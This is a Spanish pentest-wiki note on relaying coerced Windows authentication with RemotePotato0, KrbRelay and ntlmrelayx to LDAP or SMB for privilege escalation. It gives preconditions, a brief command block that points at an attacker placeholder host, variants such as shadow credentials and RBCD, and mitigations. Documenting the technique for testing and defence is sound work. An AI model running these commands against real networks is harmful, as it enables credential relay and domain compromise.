---
topic: Relay cross-session con RemotePotato0
tags: [windows, active-directory, relay, remote-potato0, krbrelay]
---

# Relay cross-session con RemotePotato0

[🌐 English](remote-potato0-relay.en.md) | **Español**

## Concepto

RemotePotato0 fuerza a una sesión interactiva a autenticarse contra un servidor controlado mediante activación COM/RPC. El hash o ticket resultante se retransmite a LDAP o SMB para obtener acceso en el contexto de otro usuario.

## Cuándo aplica

- Host Windows con sesiones interactivas de administradores.
- Servicio RPC/COM accesible y relay permitido.
- LDAP sin firma o SMB sin signing.

## Procedimiento

1. Confirmar sesiones activas y el privilegio local.
2. Iniciar el listener de relay y el servidor de activación.
3. Ejecutar RemotePotato0 contra la sesión objetivo.
4. Usar el ticket/hash capturado con `KrbRelay` o `ntlmrelayx`.

```bash
query user
RemotePotato0.exe -r <ATTACKER> -s <SESSION>
KrbRelay.exe -spn ldap/<DC> -clsid <CLSID> -rbcd <TARGET>
# O relay NTLM a LDAP/SMB con ntlmrelayx
```

## Variantes

- Relay a LDAP para crear shadow credentials.
- Relay a SMB para RBCD.
- Coerción con PetitPotam/PrinterBug como alternativa.
- Sesiones de servicio en lugar de interactivas.

## Limitaciones

- Requiere una sesión interactiva y privilegios locales.
- LDAP signing o SMB signing bloquean el relay.
- El parche de Windows puede impedir la activación.

## Mitigación y detección

- Habilitar LDAP/SMB signing y channel binding.
- Limitar sesiones interactivas de administradores en servidores.
- Monitorizar activaciones COM/RPC y autenticaciones relay.

## Referencias

- <https://github.com/antonioCoco/RemotePotato0>
- <https://github.com/cube0x0/KrbRelay>
- <https://learn.microsoft.com/en-us/defender-for-identity/compromised-credentials-alerts>
